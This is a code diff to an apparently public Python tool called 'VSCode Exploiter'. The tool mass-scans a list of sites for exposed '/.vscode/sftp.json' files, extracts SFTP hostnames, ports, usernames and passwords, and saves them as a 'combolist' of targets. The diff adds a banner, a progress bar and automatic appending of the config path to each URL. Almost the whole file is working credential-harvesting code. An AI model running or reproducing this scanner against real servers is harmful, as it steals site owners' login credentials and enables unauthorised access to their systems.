@@ -2,19 +2,42 @@ import json
 import urllib3
 import requests
 import argparse
+from tqdm import tqdm
+from rich.console import Console
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+console = Console()
 parser = argparse.ArgumentParser()
 parser.add_argument("input_file", help="Input file containing URLs to parse")
 parser.add_argument("output_file", help="Output file to save parsed information")
 parser.add_argument("-f", "--file_format", default="combolist", help="Output file format (combolist or csv)")
 args = parser.parse_args()
 
+
+banner = """
+
+                ╦  ╦╔═╗╔═╗╔═╗╔╦╗╔═╗
+                ╚╗╔╝╚═╗║  ║ ║ ║║║╣
+                 ╚╝ ╚═╝╚═╝╚═╝═╩╝╚═╝
+             ╔═╗═╗ ╦╔═╗╦  ╔═╗╦╔╦╗╔═╗╦═╗
+             ║╣ ╔╩╦╝╠═╝║  ║ ║║ ║ ║╣ ╠╦╝
+             ╚═╝╩ ╚═╩  ╩═╝╚═╝╩ ╩ ╚═╝╩╚═
+                     Chocapikk
+               (github.com/Chocapikk)
+                Stay safe,stay legal
+"""
+
+console.print(f"[bold magenta]{banner}")
 urls = []
 with open(args.input_file, "r") as input_file:
     for line in input_file:
-        urls.append(line.strip())
+        line = line.strip()
+        if not line.endswith('/.vscode/sftp.json'):
+            line += "/.vscode/sftp.json"
+        urls.append(line)
+
+progress_bar = tqdm(total=len(urls), unit=' URL', bar_format='\033[32m{l_bar}{bar}| {n_fmt}/{total_fmt} [elapsed:{elapsed}, remaining:{remaining} {rate_fmt}]\033[0m')
 
 output_list = []
 if args.file_format == "csv":
@@ -44,18 +67,22 @@ with ThreadPoolExecutor(100) as executor:
                 if response.status_code != 200:
                     pass
                 else:
-                    print(f"[+] {url} parsed")
+                    pass
+                    #console.print(f"[bold red][✔️] {url} parsed")
                 json_response = response.text
                 name, host, protocol, port, username, remotePath, password, uploadOnSave = extract_info(json_response)
                 if args.file_format == "combolist":
-                    output_list.append(f"{host}:{port} {username}:{password} {url}")
+                    output_list.append(f"{host}:{port} {username}:{password} {protocol}:{url}")
                 elif args.file_format == "csv":
                     output_list.append(f"{name}, {host}, {protocol}, {port}, {username}, {remotePath}, {password}, {uploadOnSave}, {url}")
             except requests.exceptions.RequestException:
                 pass
             except TypeError:
                 pass
+            progress_bar.update()
+        progress_bar.close()
         output_list = list(set(output_list))
         with open(args.output_file, "w") as output_file:
             for item in output_list:
                 output_file.write(item + "\n")
+        console.print('\n' + f"[bold green][✔️] File {args.output_file} has been saved with {len(output_list)} targets")
